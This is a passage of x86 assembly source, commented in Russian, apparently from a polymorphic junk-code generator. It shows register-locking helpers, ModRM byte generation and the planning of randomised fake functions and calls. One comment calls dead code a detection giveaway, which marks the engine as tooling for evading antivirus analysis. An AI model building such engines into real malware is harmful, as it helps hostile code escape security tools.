;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa write_moffs8_for_ebp 
;генерация и запись 1 байта - это либо локальная переменная, либо входной параметр для рега ebp; 
;то есть, например, [ebp - 14h] и [ebp + 1Ch] - -14h - это локальная переменная, а +1Ch - входной параметр; 
;ВХОД:
;	ebx			-	etc
;	eax			-	0 или не ноль =) (число 4); 0 - значит будем генерить локальную переменную, иначе входной параметр
;ВЫХОД:
;	eax			-	сгенерированный и записанный байтек; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
write_moffs8_for_ebp:
	test	eax, eax
	je		_ebpo8_gl_

_ebpo8_gp_:
	call	get_moffs8_ebp_param

	stosb
	jmp		_ebpo8_ret_

_ebpo8_gl_:
	call	get_moffs8_ebp_local

	stosb
_ebpo8_ret_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи write_moffs8_for_ebp
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
;============================[FUNCTIONS FOR INSTR WITH EBP & moffs8]=====================================



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа convert_r32
;преобразование регистра в нужное соответствующее число;
;например, если на входе будет число 0b (EAX), то на выходе 1b (нулевой бит = единице);
;если будет 1b (ECX), то на выходе будет 10b (первый бит равен 1-це);
;etc 
;ВХОД:
;	xm_tmp_reg0		-	число для конвертации
;ВЫХОД:
;	EAX				-	преобразованное число;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
convert_r32:
	push	ecx
	xor		eax, eax
	inc		eax
	mov		ecx, xm_tmp_reg0
	shl		eax, cl 
	pop		ecx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи convert_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа set_r32
;блокировка выбранного регистра (то есть данный регистр не будет использоваться для генерации команд)
;ВХОД:
;	xm_tmp_reg0		-	число, соОтветствующее определённому регистру, который мы хотим залочить;
;	EBX				-	address of XTG_TRASH_GEN
;ВЫХОД:
;	[ebx].fregs		-	стоит блокировка опред. рега;
;	etc
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
set_r32:
	push	eax
	
	call	convert_r32													;конверт числа
	
	test	[ebx].fregs, eax											;если данный reg уже был залочен (например, циклом), 
	je		_r32un_														;тогда xm_tmp_reg0 = -1. Это сделано для того, чтобы не разлочить ранее залоченный рег. 
	or		xm_tmp_reg0, -01											;Например, ранее был залочен рег EAX конструкцией "цикл". И сразу после этого мы попали на генерацию команды [XCHG REG32, REG32]. 
																		;Там же указано, чтобы мы залочили рег EAX. Но он уже залочен, поэтому мы делаем xm_tmp_reg0 = -1, чтобы 
																		;по окончанию генерации данной команды не сбросить EAX. Иначе "цикл" будет неправильно работать
_r32un_:
	or		[ebx].fregs, eax											;лочим регистр (для ранее залоченного это не даст никакого эффекта);
	pop		eax
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи set_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа unset_r32
;разблокирование выбранного регистра (то есть выбранный рег можно снова юзать для генерации команд)
;ВХОД:
;	xm_tmp_reg0		-	регистр, который хотим разлочить;
;	EBX				-	XTG_TRASH_GEN; 
;ВЫХОД:
;	[ebx].fregs		-	разлок рега;
;	etc
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
unset_r32:
	cmp		xm_tmp_reg0, -01											;если стоит -1, тогда регистр не нужно сбрасывать (разблокировать)
	je		_ur32_ret_
	push	eax
	
	call	convert_r32
	
	or		xm_tmp_reg0, -01											;инициализируем xm_tmp_reg0 = -1; 
	xor		[ebx].fregs, eax											;сбросим рег; 
	pop		eax
_ur32_ret_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи unset_r32; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа is_free_r32
;проверка регистра - свободен ли он? (можно ли его юзать для созданию команд?)
;ВХОД:
;	xm_tmp_reg0 
;ВЫХОД:
;	EAX				-	-1, если рег занят, иначе любое число, не равное -1; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
is_free_r32:
	call	convert_r32
	
	or		xm_tmp_reg0, -01 											;инициализация
	test	[ebx].fregs, eax
	je		_ifr32_ret_
	or		eax, -01
_ifr32_ret_:
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи is_free_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
	 


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа get_rnd_r
;генерация случайного числа (регистра)
;ВХОД:
;	EBX		-	XTG_TRASH_GEN;
;ВЫХОД:
;	EAX		-	СЧ [0..7]; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_rnd_r:
	push	08
	call	[ebx].rang_addr
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_rnd_r 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа check_r
;проверка регистра на занятость
;ВХОД:
;	EAX		-	число (регистр)
;	EBX		-	XTG_TRASH_GEN; 
;ВЫХОД:
;	EAX		-	входное значение, если все 0k, иначе EAX = -1;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
check_r:
	push	ecx
	cmp		al, 04														;ESP 
	je		_nvr_
	cmp		al, 05														;EBP
	je		_nvr_
	xor		ecx, ecx
	inc		ecx
	push	eax
	xchg	eax, ecx
	shl		eax, cl
	test	[ebx].fregs, eax
	pop		eax
	je		_chkr_ret_
_nvr_:	
	or		eax, -01
_chkr_ret_:
	pop		ecx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи check_r
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа get_free_r32
;получение свободного регистра (EAX/ECX/EDX/EBX/etc)
;ВХОД:
;ВЫХОД:
;	EAX		-	число (регистр) (номер свободного регистра);  
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_free_r32:
	call	get_rnd_r
	
	call	check_r
	
	inc		eax
	je		get_free_r32
	dec		eax
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_free_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

	

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа modrm_mod11_for_r32
;генерация байта MODRM с mod = 11b;
;ВЫХОД:
;	EAX		-	байт MODRM; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
modrm_mod11_for_r32:
	push	edx
	call	get_free_r32
	
	mov		xm_tmp_reg1, eax
	shl		eax, 03
	add		al, 0C0h
	xchg	eax, edx
	
	call	get_free_r32
	
	mov		xm_tmp_reg2, eax
	add		eax, edx
	pop		edx
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи modrm_mod11_for_r32
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа get_free_r8
;получение свободного регистра (AL/CL/DL/BL/AH/CH/DH/BH)
;ВХОД:
;ВЫХОД:
;	EAX		-	число (номер свободного регистра); 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
get_free_r8:
	call	get_rnd_r
	
	push	eax
	cmp		al, 04
	jl		_alcrct_
	sub		al, 04														;отнимаем, так как al = 0, ah = 4, cl = 1, ch = 4 + 1 = 5; Это все части одного регистра (EAX/ECX/EDX/EBX); 

_alcrct_:	
	call	check_r
	
	inc		eax
	pop		eax
	je		get_free_r8
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи get_free_r8 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa modrm_mod11_for_r8
;генерация байта MODRM с mod = 11b
;ВЫХОД:
;	EAX		-	байт MODRM; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
modrm_mod11_for_r8:
	push	edx
	call	get_free_r8

	mov		xm_tmp_reg1, eax
	shl		eax, 03
	add		al, 0C0h
	xchg	eax, edx

	call	get_free_r8

	mov		xm_tmp_reg2, eax
	add		eax, edx
	pop		edx 
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи modrm_mod11_for_r8 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx



;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функа gen_data_for_func 
;генерация различных данных, нужных для создания функций и вызовов функций;
;ака генерация и заполнение массива структур XTG_FUNC_STRUCT
;ВХОД:
;	EBX				-	адрес структуры XTG_TRASH_GEN
;ВЫХОД:
;	EAX				-	0, если генерация не получилась (ака хуйня), иначе адрес массива структур XTG_FUNC_STRUCT
;	xtg_tmp_var1	-	адрес массива структур XTG_FUNC_STRUCT
;	xtg_tmp_var2	-	кол-во функций, сколько надо сгенерить (кол-во сгенеренных и заполненых структур XTG_FUNC_STRUCT);
;	;xtg_tmp_var3	-	новый адрес для esp под (новый) стек; 
;	(+)				-	заполняются выходные поля структуры XTG_TRASH_GEN и входное поле xfunc_struct_addr
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
init_local_max_size		equ		10										;инициализация локальной переменной(ых) - максимальный размер; должно быть >= 3; 
max_local_num			equ		10										;максимальное количество локальных переменных; если сделать их больше 31, тогда в движке предусмотреть генерацию и таких перем., т.к. они имеют большую длину команд; 
max_param_num			equ		5										;максимальное кол-во входных параметров; если сделать их больше 31, тогда в движке предусмотреть генерацию и таких перем., т.к. они имеют большую длину команд; 
param_max_size			equ		6										;максимальный размер одного входного параметра (push dword ptr [403008h] = 6 bytes); смотрим в функу gen_param_for_func - если там изменения есть, то и для этого параметра возможно тогда тоже; 
trash_max_size			equ		35										;максимальный размер одной пачки мусора;  должен быть >= 6; 
max_func				equ		10										;максимальное кол-во функций, которые можно сгенерить (= максимальному уровню рекурсии); 
func_size				equ		(01 + 02 + 06 + init_local_max_size + 02 + 01 + 03 + ((max_func - 01) * 5) + (max_param_num * param_max_size * (max_func - 01)) + trash_max_size)  
																		;поясним: 
													   					;push ebp - 01;
													   					;mov ebp, esp - 02 bytes;
													   					;sub esp,XXXXXXXXh 
													   					;mov dword ptr [ebp - XXXXXXXXh], XXXXXXXXh - 10 - инициализация хотя бы одной локал. перем; 
													   					;mov esp, ebp - 02; (или leave - 1); но мы берем по max; 
													   					;pop ebp - 1;
													   					;ret XXh - 3;
													   					;call XXXXXXXXh - размер max кол-ва вызовов в функе (max_func - 1) * 5 byte; 
													   					;push 05 etc - (max_param_num * 6 * (max_func - 01)) - максимальное кол-во входных параметров в функу * max размер одного такого параметра * max кол-во вызовов (call'ов); 
													   					;trash - 100; трэшовый код; 
													   					;максимальный размер функции; 
gen_data_for_func:
	push	ecx															;сохраняем в стеке регистры, которые будем сейчас использовать; 
	push	edx
	push	esi
	push	edi
	assume	ecx: ptr XTG_FUNC_STRUCT
	assume	edx: ptr XTG_FUNC_STRUCT 
	assume	edi: ptr XTG_FUNC_STRUCT 
	xor		eax, eax
	cmp		[ebx].fmode, XTG_REALISTIC									;вначале проверим, какой юзаем режим генерации трэша?
	jne		_gd4f_ret_ 
	test	[ebx].xmask1, XTG_FUNC										;затем проверим, выставлен ли данный флаг? он означает, что можно генерить функи и их вызовы (call'ы); 
	je		_gd4f_ret_ 
	cmp		[ebx].trash_size, (max_func * func_size)					;далее проверяем, хватит ли нам переданных байтов для генерации функций?
	jl		_gd4f_ret_
	cmp		[ebx].alloc_addr, 0											;а также проверим, переданы ли адреса функций выделения и освобождения памяти? 
	je		_gd4f_ret_	
	cmp		[ebx].free_addr, 0
	je		_gd4f_ret_

	push	(sizeof (XTG_FUNC_STRUCT) * max_func + 04)					;+ size_of_stack_commit + 04
	call	[ebx].alloc_addr 											;если всё отлично, тогда выделим память под (// стеk &) структуры XTG_FUNC_STRUCT, которые сейчас будем заполнять; 

	test	eax, eax 
	je		_gd4f_ret_

	mov		xtg_tmp_var1, eax 											;xtg_tmp_var1 - сохраним в данной переменнной адрес выделенного участка памяти; 
	and		xtg_tmp_var2, 0												;xtg_tmp_var2 = 0; 
	xchg	eax, edi													;edi - адрес выделенной памяти; 
	and		[edi].call_num, 0											;делаем данное поле, принадлежащее первой структе (первой функе) = 0; 
	
	push	max_func													;случайно определим, сколько фунок будем генерить; 
	call	[ebx].rang_addr

	;mov	eax, 1														;for test; 
	
	lea		esi, dword ptr [eax + 01]  									;полюбому у нас будет хотя бы одна функа; 
	xor		edx, edx
	mov		eax, [ebx].trash_size										;eax = size of trash; 
	div		esi															;eax = max размеру одной функи;
	mov		xtg_tmp_var4, eax											;сохраним это значение в xtg_tmp_var4; 
	xor		edx, edx
	mov		eax, [ebx].tw_trash_addr									;eax = адресу для записи трэша; 
	mov		xtg_tmp_var5, eax
_gd4f_cycle_01_: 														;далее идет цикл, в котором генерятся различные параметры и заполняются структурки; 
																		;и тут такая фича: например, мы будем генерить 5 функций. Значит у нас есть 5 структур XTG_FUNC_STRUCT. Первая структура имеет индекс 0, вторая - 1 и т.д.
																		;Так вот, фишка в том, что функа 1 (для нее структура 1-ая, у которой индекс 0) max может вызвать функи 2,3,4 и 5. Функа 2 max может вызвать только 3,4 и 5. 3-я функа - max 4 и 5.
																		;4-ая - max только 5, а 5-ая - никого. Причем, функа 1 обязательно должна содержать хотя бы 1 вызов другой функи. 
																		;Конкретный пример: выбрана генерация 5 функций. Значит всего в функциях может быть max 5 - 1 = 4 вызова. Далее, во время заполнения структуры для функи 1 смотрим: пока 0 обработанных структур и сумма вызовов тоже = 0. 
																		;0 - 0 = 0 == 0. Далее, сгенерили для первой функи 2 вызова. Затем попадаем на генерацию 2 структуры (данных для 2-ой функи). Тут - обработана уже 1 структура (та, что для первой функи), и сгенерировано 2 вызова (те, что для первой функи). 
																		;1 - 2 = -1 < 0 -> и, допустим для 2-ой структы 1 вызов будет. После, переходим на 3-ю структурку. Уже обработано 2 структы и всего 3 вызова: 2 - 3 = -1 < 0;
																		;Теперь, для 3-ей структы, допустим будет 0 вызовов. Теперь на 4-ю структу: обработано 3 структуры и 3 вызова: 3 - 3 = 0 == 0;
																		;и для 4-ой структы тоже выпало 0 вызовов. Теперь на пятую структу: 4 обработанных структы и 3 вызова: 4 - 3 = 1 > 0 ->добавляем это число в call_num для первой структы;
																		;таким образом неиспользованные вызовы мы будем добавлять в call_num первой структуры; и все после сгенеренные функи будут вызваны и всё отлично! 

	mov		ecx, edx													;ecx = edx -> это индекс структурки (например, индекс 0 - это первая структурка), это equ кол-во заполненных структур (ака функций) (0 - 0 заполненных структур); 
	sub		ecx, xtg_tmp_var2											;отнимаем от кол-ва обработанных функций кол-во вызовов - если это полученное значение > 0, тогда добавляем его к полю call_num первой структы (функи); 
	jb		_gd4f_correct_call_num_for_1st_func_ 						;если так не сделать, тогда какая-то из сгенерированных функций может никогда не получить управление; 
	add		[edi].call_num, ecx											;если полученное значение > 0, тогда добавим; если же < (<=) 0, тогда все функи, которым соотв-ют все обработанные структы, будут вызваны; 
	add		xtg_tmp_var2, ecx

_gd4f_correct_call_num_for_1st_func_: 
	
	mov		eax, esi													;
	sub		eax, xtg_tmp_var2											;сколько еще осталось свободных вызовов

_gd4f_nxt_1_:
	push	eax															;данная функа сколько будет иметь вызовов (call'ов)? 
	call	[ebx].rang_addr

	test	edx, edx													;если это функа 1
	jne		_gd4f_nxt_2_	
	cmp		esi, 01														;и кол-во генерируемых фунок > 1, 
	je		_gd4f_nxt_2_ 
	test	eax, eax													;то функа 1 будет иметь как минимум 1 вызов, иначе другие функи не будут вызваны - а это мертвый код; палево; 
	jne		_gd4f_nxt_2_
	inc		eax 
_gd4f_nxt_2_:
	imul	ecx, edx, sizeof (XTG_FUNC_STRUCT)
	mov		[edi + ecx].call_num, eax									;записываем кол-во вызовов;
	add		xtg_tmp_var2, eax											;в данной переменной содержится значение - сколько всего вызовов уже будет, это число всегда на 1 меньше max числа фунок, само-собой; 
	mov		eax, xtg_tmp_var5
	mov		[edi + ecx].func_addr, eax									;адрес данной будущей функи в коде;

	push	max_local_num
	call	[ebx].rang_addr								

	mov		[edi + ecx].local_num, eax									;кол-во локальных переменных

	push	max_param_num
	call	[ebx].rang_addr
	
	test	edx, edx 													;если сейчас генерируются данные для функи 1, тогда она не имеет входных параметров; 
	jne		_gd4f_nxt_3_
	xor		eax, eax
_gd4f_nxt_3_:
	mov		[edi + ecx].param_num, eax 									;кол-во входящих параметров
	mov		eax, xtg_tmp_var4
	sub		eax, func_size

	push	eax
	call	[ebx].rang_addr

	add		eax, func_size   
	mov		[edi + ecx].func_size, eax									;размер данной функи;
	add		eax, [edi + ecx].func_addr
	mov		xtg_tmp_var5, eax
	inc		edx 
	cmp		edx, esi													;переходим к генерации данных для следующей функи; 
	jne		_gd4f_cycle_01_
	dec		esi
	imul	eax, esi, sizeof (XTG_FUNC_STRUCT) 
	mov		xtg_tmp_var2, edx											;данная переменная теперь хранит кол-во генерируемых функций; 
	mov		edx, [ebx].trash_size										;edx - размер мусора (в байтах), сколько всего надо сгенерировать; 
	mov		ecx, [edi + eax].func_addr									;ecx - содержит адрес функи в последней структуре (адрес последней функи, так как адреса сейчас находятся в порядке возрастания); 
	sub		edx, ecx													;отнимаем этот адрес
	sub		edx, [edi + eax].func_size									;и размер последней функи
	add		edx, [edi].func_addr										;и добавляем адрес первой функи - таким образом в edx будет кол-во несгенерированных (незаписанных) байтов;
	add		[edi + eax].func_size, edx									;добавим эти байты к размеру последней функи - таким образом мы сгенерируем все байты, сколько указано в [ebx].trash_size; 
	add		ecx, [edi + eax].func_size									;ecx += размер данной (последней) функи - теперь ecx содержит адрес сразу за концом последней функи; 
	mov		[ebx].fnw_addr, ecx											;и этот адрес будет адресом для дальнейшей записи трэша;
	sub		ecx, [edi].func_addr										;отнимаем от этого адреса адрес самой первой функи, и получаем число реально записанных байтов. Эти байты однозначно будут записаны, так как в режиме 
	mov		[ebx].nobw, ecx												;реалистичность будут всегда записаны все байты (возможна генерация всех команд); и функи будут создаваться только в этом режиме; 
 	xor		ecx, ecx

_gd4f_cycle_02_: 														;тут делаем следующее: структурки также остаются на своих местах, но поля func_addr & func_size случайно меняем местами в структурах 
																		;тем самым получается так, что функи будут всегда разными, вызовы разные, на разных местах всё; 
 	push	xtg_tmp_var2
 	call	[ebx].rang_addr

	imul	eax, eax, sizeof (XTG_FUNC_STRUCT)
	imul	edx, ecx, sizeof (XTG_FUNC_STRUCT)
	mov		esi, [edi + eax].func_addr
	mov		xtg_tmp_var3, esi
	mov		esi, [edi + eax].func_size
	mov		xtg_tmp_var4, esi
	mov		esi, [edi + edx].func_addr
	mov		[edi + eax].func_addr, esi
	mov		esi, [edi + edx].func_size
	mov		[edi + eax].func_size, esi
	mov		esi, xtg_tmp_var3
	mov		[edi + edx].func_addr, esi
	mov		esi, xtg_tmp_var4
	mov		[edi + edx].func_size, esi 
	inc		ecx 
	cmp		ecx, xtg_tmp_var2
	jne		_gd4f_cycle_02_
	mov		eax, [edi].func_addr										;теперь берем адрес функи в самой первой структуре - но эта функа может быть не первой, так как только что мы рэндомно размешали размеры и адреса фунок; 
	mov		[ebx].ep_trash_addr, eax   
	mov		[ebx].xfunc_struct_addr, edi
	;lea	eax, dword ptr [edi + (sizeof (XTG_FUNC_STRUCT) * max_func + size_of_stack_commit)]
	;mov	xtg_tmp_var3, eax											;сохраним в данной переменной адрес в выделенной памяти - этот участок отведен под (новый) стек; 
	xchg	eax, edi 
_gd4f_ret_:	
	pop		edi 
	pop		esi
	pop		edx
	pop		ecx 
	ret																	;на выход! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функи gen_data_for_func 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 


;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;функa gen_func
;генерация функций с прологами, резервированием стэка для локальных переменных, инициализацией локальных 
;переменных, трэшем, передачей входных параметров и вызовами (call's) других функций, эпилогами, ret'ами; 
;ВХОД (stdcall: gen_func(param1, param2)):
;	param1								-	адрес структуры XTG_TRASH_GEN
;	param2								-	адрес структуры XTG_EXT_TRASH_GEN
;	(+) XTG_TRASH_GEN.xfunc_struct_addr	-	адрес (заполненной корректно) структуры XTG_FUNC_STRUCT 
;ВЫХОД:
;	EAX									-	адрес структуры XTG_FUNC_STRUCT; 
;ЗАМЕТКИ:
;	1) 
;	Функи будут генерироваться именно так, чтобы движок логики построения команд отлично работал с 
;	данным трэшгеном. То есть если, например, генерится сейчас функция, то строится пролог и т.п., затем 
;	трэш, и далее, допустим генерим вызов на другую функу. И сразу после этого мы начинаем генерить 
;	прологи и т.п. уже другой функи (получается рекурсия в gen_func). И затем, когда вторая функа была 
;	сгенерена и у нее не было других вызовов, то мы выходим из нее, и снова продолжаем достраивать 
;	первую функу. То есть мы строим наш код именно так, как он будет реально работать. А именно сначала 
;	будет работать первая функа, затем вызов и переход на вторую, затем возврат в первую и всё.
;	Таким образом мы сможем сделать правильную логику кода, эмулируя и проверяя/поправляя последовательно 
;	команду за командой. По этой же причине мы можем вызвать только 1 раз одну функу, и больше ее нельзя 
;	вызывать, даже из других функций - потому что она уже построена. Пока такой вариант =)  
;
;	2)
;	функи можно строить, если режим реалистичность, выставлен флаг XTG_FUNC и переданы адреса функций 
;	выделения/освобождения памяти. 
;	
;	3)
;	как вариант, можно выделить еще больше памяти и передать этот адрес в esp - новый стэк. И можно строить
;	еще больше функций;
;
;	4)
;	пример: допустим, выбрано, что мы будем генерить 4 функи, причем первая функа func_1 (первая 
;	структура XTG_FUNC_STRUCT) имеет 2 вызова (поле call_num), вторая - 1, 3-я ноль и 4-ая тоже 0. Так 
;	вот, строиться все эти функи будут так: 
;	сначала строится func_1: пролог, трэш (возможно, что резервирование стэка, иниц-я локал. перем.). 
;	Затем, смотрим, что у функи есть 2 вызова. Строим первый вызов на func_2, затем переходим 
;	(рекурсивно) на генерацию func_2. Дошли до генерации ее вызовов, и видим, что у нее есть 1 вызов - 
;	генерим его на func_3. И переходим на генерацию func_3. Там также, строим прологи etc. Далее, видим, 
